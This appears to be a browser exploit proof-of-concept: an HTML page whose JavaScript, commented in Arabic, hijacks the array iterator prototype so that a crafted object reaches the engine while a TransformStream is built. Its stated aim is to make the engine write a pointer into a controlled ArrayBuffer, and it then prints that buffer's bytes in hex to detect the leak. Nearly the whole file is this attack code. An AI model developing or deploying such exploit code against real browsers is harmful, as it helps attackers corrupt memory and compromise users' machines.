<html>
<body>
<div id="result">Testing...</div>
<script>
// اكتب النتيجة فوراً قبل أي شيء
document.getElementById("result").textContent = "Step 1: Starting...";

// استخدم ArrayBuffer صغير
let buf = new ArrayBuffer(8);
let view = new DataView(buf);
let f64 = new Float64Array(buf);

// Variant: مرر كائن يحتوي على Float64Array
// الهدف: جعل المحرك يكتب مؤشراً في buf بدل الكتابة في 0x4141
let trick = {
    size: 0,
    highWaterMark: 0,
    type: undefined,
    start: undefined,
    pull: undefined,
    cancel: undefined,
    buf: buf,
    f64: f64
};

try {
    Array.prototype[Symbol.iterator] = function() {
        const arr = this;
        let i = 0;
        return {
            next() {
                if (i >= arr.length)
                    return { done: true };
                let val = arr[i];
                if (arr.length === 3 && i >= 1)
                    val = trick;
                i++;
                return { value: val, done: false };
            }
        };
    };

    // هذا قد يكرش أو قد لا يكرش
    let stream = new TransformStream();
    
    // إذا وصلنا هنا، لم يكرش!
    document.getElementById("result").textContent = "NO CRASH! buf = " + f64[0];
    
} catch(e) {
    // إذا وصلنا هنا، الـ TypeError تم التقاطه
    document.getElementById("result").textContent = "CAUGHT: " + e.message;
    
    // تحقق من buf
    let hex = "";
    for (let i = 0; i < 8; i++) {
        hex += view.getUint8(i).toString(16).padStart(2, '0') + " ";
    }
    document.getElementById("result").textContent += " | buf: " + hex;
}

// استعادة
Array.prototype[Symbol.iterator] = [][Symbol.iterator];
</script>
</body>
</html>
